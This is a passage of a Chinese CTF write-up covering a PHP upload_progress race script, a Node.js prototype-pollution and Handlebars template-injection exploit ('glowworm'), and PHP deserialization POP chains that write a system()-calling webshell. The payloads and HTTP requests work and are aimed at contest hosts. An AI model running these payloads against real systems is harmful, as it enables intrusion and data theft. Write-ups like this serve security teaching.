sys.exit(<span class="number">0</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">    t1 = threading.Thread(target=POST, args=(session, ))</span><br><span class="line">    t1.daemon = <span class="literal">True</span></span><br><span class="line">    t1.start()</span><br><span class="line"> </span><br><span class="line">    READ(session)</span><br></pre></td></tr></table></figure><p>注意upload_progress好像有缓存，每次需要更换sessid</p><h3 id="glowworm"><a href="#glowworm" class="headerlink" title="glowworm"></a>glowworm</h3><p>/source<br><img src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_af53a924ddaaa5251a8b936688e813e8.png" alt></p><p>source 文件</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>)</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"><span class="keyword">const</span> FLAG = <span class="string">'flag&#123;test_test&#125;'</span>;</span><br><span class="line"> </span><br><span class="line">app.set(<span class="string">'view engine'</span>, <span class="string">'html'</span>);</span><br><span class="line">app.engine(<span class="string">'html'</span>, <span class="built_in">require</span>(<span class="string">'hbs'</span>).__express);</span><br><span class="line">app.use(express.urlencoded());</span><br><span class="line">app.use(bodyParser.urlencoded(&#123; extended: <span class="literal">true</span> &#125;)).use(bodyParser.json())</span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> glowworm = [];</span><br><span class="line"><span class="keyword">var</span> content = [];</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sha1</span>(<span class="params"><span class="built_in">string</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> crypto.createHash(<span class="string">"sha1"</span>).update(<span class="built_in">string</span>).digest(<span class="string">"hex"</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; page &#125; = req.query;</span><br><span class="line">    <span class="keyword">if</span> (!page) res.redirect(<span class="string">'/?page=index'</span>);</span><br><span class="line">    <span class="keyword">else</span> res.render(page, &#123; FLAG, <span class="string">'insect'</span>: <span class="string">'glowworm'</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line">app.get(<span class="string">'/source'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.sendFile(path.join(__dirname + <span class="string">'/app.js'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line">app.post(<span class="string">'/data'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> worm = req.body;</span><br><span class="line">    content[worm.wing][worm.fire] = worm.data;</span><br><span class="line">    res.end(<span class="string">'data success'</span>)</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line">app.get(<span class="string">'/refresh'</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> files = [];</span><br><span class="line">    <span class="keyword">var</span> paths = path.join(__dirname, <span class="string">'views/sandbox'</span>)</span><br><span class="line">    <span class="keyword">if</span> (fs.existsSync(paths)) &#123;</span><br><span class="line">        files = fs.readdirSync(paths);</span><br><span class="line">        files.forEach(<span class="function">(<span class="params">file, index</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> curPath = paths + <span class="string">"/"</span> + file;</span><br><span class="line">            <span class="keyword">if</span> (fs.statSync(curPath).isFile()) &#123;</span><br><span class="line">                fs.unlinkSync(curPath);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    res.end(<span class="string">'refresh success'</span>)</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line">app.post(<span class="string">'/'</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> key = <span class="string">"worm"</span>;</span><br><span class="line">    <span class="keyword">const</span> &#123; content, a, b &#125; = req.body;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (!a || !b || a.length !== b.length) &#123;</span><br><span class="line">        res.send(<span class="string">"no!!!"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (a !== b &amp;&amp; sha1(key + a) === sha1(key + b)) &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">console</span>.log(glowworm.token1);</span><br><span class="line">        <span class="built_in">console</span>.log(sha1(glowworm.token1));</span><br><span class="line">        <span class="comment">//console.log( === req.query.token2);</span></span><br><span class="line">        <span class="keyword">if</span> (glowworm.token1 &amp;&amp; req.query.token2 &amp;&amp; sha1(glowworm.token1) === req.query.token2) &#123;</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">typeof</span> content !== <span class="string">'string'</span> || content.indexOf(<span class="string">'FLAG'</span>) != <span class="number">-1</span>) &#123;</span><br><span class="line">                res.end(<span class="string">'ban!!!'</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">const</span> filename = crypto.randomBytes(<span class="number">8</span>).toString(<span class="string">'hex'</span>);</span><br><span class="line">            fs.writeFile(<span class="string">`<span class="subst">$&#123;path.join(<span class="string">'views'</span>,<span class="string">'sandbox'</span>,filename)&#125;</span>.html`</span>, content, <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">                res.redirect(<span class="string">`/?page=sandbox/<span class="subst">$&#123;filename&#125;</span>`</span>);</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.send(<span class="string">"no no no!!!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.send(<span class="string">"no no!!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line">app.listen(<span class="number">8888</span>, <span class="string">'0.0.0.0'</span>);</span><br></pre></td></tr></table></figure><p>两个点，第一个js数组的toString特性来绕过sha1的判断。<br>第二个，修改content的<strong>proto</strong>来设置不存在的token1值。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">POST</span> <span class="string">/data</span> <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="attr">Host:</span> <span class="number">119.61</span><span class="number">.19</span><span class="number">.212</span><span class="string">:57302</span></span><br><span class="line"><span class="attr">Content-Length:</span> <span class="number">64</span></span><br><span class="line"><span class="attr">Cache-Control:</span> <span class="string">max-age=0</span></span><br><span class="line"><span class="attr">Origin:</span> <span class="string">http://119.61.19.212:57302</span></span><br><span class="line"><span class="attr">Upgrade-Insecure-Requests:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">DNT:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">Content-Type:</span> <span class="string">application/x-www-form-urlencoded</span></span><br><span class="line"><span class="attr">User-Agent:</span> <span class="string">Mozilla/5.0</span> <span class="string">(Macintosh;</span> <span class="string">Intel</span> <span class="string">Mac</span> <span class="string">OS</span> <span class="string">X</span> <span class="string">10_14_6)</span> <span class="string">AppleWebKit/537.36</span> <span class="string">(KHTML,</span> <span class="string">like</span> <span class="string">Gecko)</span> <span class="string">Chrome/94.0.4606.81</span> <span class="string">Safari/537.36</span></span><br><span class="line"><span class="attr">Accept:</span> <span class="string">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="attr">Referer:</span> <span class="string">http://119.61.19.212:57302/data</span></span><br><span class="line"><span class="attr">Accept-Encoding:</span> <span class="string">gzip,</span> <span class="string">deflate</span></span><br><span class="line"><span class="attr">Accept-Language:</span> <span class="string">en,zh-CN;q=0.9,zh;q=0.8,ja;q=0.7</span></span><br><span class="line"><span class="attr">Connection:</span> <span class="string">close</span></span><br><span class="line"> </span><br><span class="line"><span class="string">wing=__proto__&amp;fire=token1&amp;data=db695c5157f851223d6c03fa3e63ba53</span></span><br></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /?token<span class="number">2</span>=<span class="number">1900</span>dc<span class="number">271</span>bb<span class="number">39160</span>b<span class="number">01</span>ba<span class="number">20</span>b<span class="number">3</span>fc<span class="number">247</span>bd<span class="number">238</span>cfcc<span class="number">3</span> HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">119.61</span>.<span class="number">19.212</span>:<span class="number">57302</span></span><br><span class="line">Content-Length: <span class="number">189</span></span><br><span class="line">Cache-Control: <span class="keyword">max</span>-age=<span class="number">0</span></span><br><span class="line">Origin: http://<span class="number">119.61</span>.<span class="number">19.212</span>:<span class="number">57302</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">DNT: <span class="number">1</span></span><br><span class="line">Content-Type: application/<span class="keyword">x</span>-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh<span class="comment">; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36</span></span><br><span class="line"><span class="comment">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Referer: http://119.61.19.212:57302/?page=index</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: en,zh-CN;q=0.9,zh;q=0.8,ja;q=0.7</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">a[]=a&amp;b=a&amp;content=%7b%7b%23%65%61%63%68%20%74%68%69%73%7d%7d%7b%7b%40%6b%65%79%7d%7d%20%3d%3e%20%7b%7b%74%68%69%73%2e%74%6f%53%74%72%69%6e%67%7d%7d%3c%62%72%3e%7b%7b%2f%65%61%63%68%7d%7d%0a</span></span><br></pre></td></tr></table></figure><p>hbs模板注入信息泄露<br><a href="https://threezh1.com/2020/12/28/华为HCIE的第一课%20Writeup/#hbs模板注入导致信息泄露" target="_blank" rel="noopener">https://threezh1.com/2020/12/28/华为HCIE的第一课%20Writeup/#hbs模板注入导致信息泄露</a></p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;&#123;#<span class="name"><span class="builtin-name">each</span></span> this&#125;&#125;</span><span class="template-variable">&#123;&#123;@key&#125;&#125;</span><span class="xml"> =&gt; </span><span class="template-variable">&#123;&#123;this.toString&#125;&#125;</span><span class="xml"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><span class="template-tag">&#123;&#123;/<span class="name"><span class="builtin-name">each</span></span>&#125;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_af66a4215b70ac5d27ae90729e7a02e3.png" alt></p><p>因为可以执行一定的系统命令，其他队的师傅还想到了直接<code>tar</code>打包全部的php的内容，然后下载。单个环境，写入的shell也非常容易被上车。</p><h3 id="flag在哪里"><a href="#flag在哪里" class="headerlink" title="flag在哪里"></a>flag在哪里</h3><p>首先思路是构造pop读getflag.php</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">begin</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $file;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $mode;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $content;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $choice;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;mode==<span class="string">"write"</span>)&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;choice= <span class="keyword">new</span> write();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;mode==<span class="string">"read"</span>)&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;choice= <span class="keyword">new</span> read();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($file,$content)</span> </span>&#123;</span></span><br><span class="line"><span class="php">        highlight_file(<span class="keyword">$this</span>-&gt;file);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;mode==<span class="string">"write"</span>)&#123;</span></span><br><span class="line"><span class="php">            var_dump(<span class="keyword">$this</span>);</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;choice-&gt;writewritetxt(<span class="keyword">$this</span>-&gt;file,<span class="keyword">$this</span>-&gt;content);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;choice-&gt;open(<span class="keyword">$this</span>-&gt;file);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">write</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">writewritetxt</span><span class="params">($file,$content)</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        $filename=$file.<span class="string">".txt"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(is_file($filename))&#123;</span></span><br><span class="line"><span class="php">            unlink($filename);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        file_put_contents($filename, $content);</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"成功写入"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">read</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $file;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="comment">// $this-&gt;file="test.txt";</span></span></span><br><span class="line"><span class="php">        <span class="comment">// echo "欢迎查看  ".$this-&gt;file."&lt;br/&gt;";</span></span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">open</span><span class="params">($filename)</span></span>&#123;</span></span><br><span class="line"><span class="php">        $file=<span class="keyword">$this</span>-&gt;file;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(is_file($file))&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span>($file==<span class="string">"getflag.php"</span>)&#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">die</span>(<span class="string">"getflag.php没东西"</span>);</span></span><br><span class="line"><span class="php">                &#125;</span></span><br><span class="line"><span class="php">            <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">                highlight_file($file);</span></span><br><span class="line"><span class="php">                &#125;</span></span><br><span class="line"><span class="php">        &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"文件不存在"</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php">$a=<span class="keyword">new</span> begin();</span></span><br><span class="line"><span class="php">$a-&gt;file = <span class="string">'file:///etc/passwd'</span>;</span></span><br><span class="line"><span class="php">$a-&gt;mode = <span class="string">'asdas'</span>;</span></span><br><span class="line"><span class="php">$b=<span class="keyword">new</span> begin();</span></span><br><span class="line"><span class="php">$b-&gt;file= <span class="string">'getflag.php'</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> urlencode(serialize($a));</span></span><br></pre></td></tr></table></figure><p>调用begin的call方法，读getflag文件。</p><p>然后写文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">begin</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $file;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $mode;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $content;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $choice;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;file = <span class="string">'b0eacc6cb3904a848106501cda4d4f25'</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;mode = <span class="string">'write'</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;content = <span class="string">'&lt;?php system("cat _f_l_a_g.php");?&gt;'</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;choice=<span class="keyword">new</span> write();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;mode==<span class="string">"write"</span>)&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;choice= <span class="keyword">new</span> write();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;mode==<span class="string">"read"</span>)&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;choice= <span class="keyword">new</span> read();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($file,$content)</span> </span>&#123;</span></span><br><span class="line"><span class="php">        highlight_file(<span class="keyword">$this</span>-&gt;file);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;mode==<span class="string">"write"</span>)&#123;</span></span><br><span class="line"><span class="php">            var_dump(<span class="keyword">$this</span>);</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;choice-&gt;writewritetxt(<span class="keyword">$this</span>-&gt;file,<span class="keyword">$this</span>-&gt;content);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;choice-&gt;open(<span class="keyword">$this</span>-&gt;file);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">write</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">writewritetxt</span><span class="params">($file,$content)</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        $filename=$file.<span class="string">".txt"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(is_file($filename))&#123;</span></span><br><span class="line"><span class="php">            unlink($filename);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        file_put_contents($filename, $content);</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"成功写入"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">read</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $file;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="comment">// $this-&gt;file="test.txt";</span></span></span><br><span class="line"><span class="php">        <span class="comment">// echo "欢迎查看  ".$this-&gt;file."&lt;br/&gt;";</span></span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">open</span><span class="params">($filename)</span></span>&#123;</span></span><br><span class="line"><span class="php">        $file=<span class="keyword">$this</span>-&gt;file;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(is_file($file))&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span>($file==<span class="string">"getflag.php"</span>)&#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">die</span>(<span class="string">"getflag.php没东西"</span>);</span></span><br><span class="line"><span class="php">                &#125;</span></span><br><span class="line"><span class="php">            <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">                highlight_file($file);</span></span><br><span class="line"><span class="php">                &#125;</span></span><br><span class="line"><span class="php">        &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"文件不存在"</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php">$a=<span class="keyword">new</span> begin();</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> urlencode(serialize($a));</span></span><br></pre></td></tr></table></figure><p>这里payload要做修改，将s换成<code>\73</code>,左右括号换成<code>\28</code>，<code>\29</code>，content的中的s大写,大概这样。</p><figure class="highlight 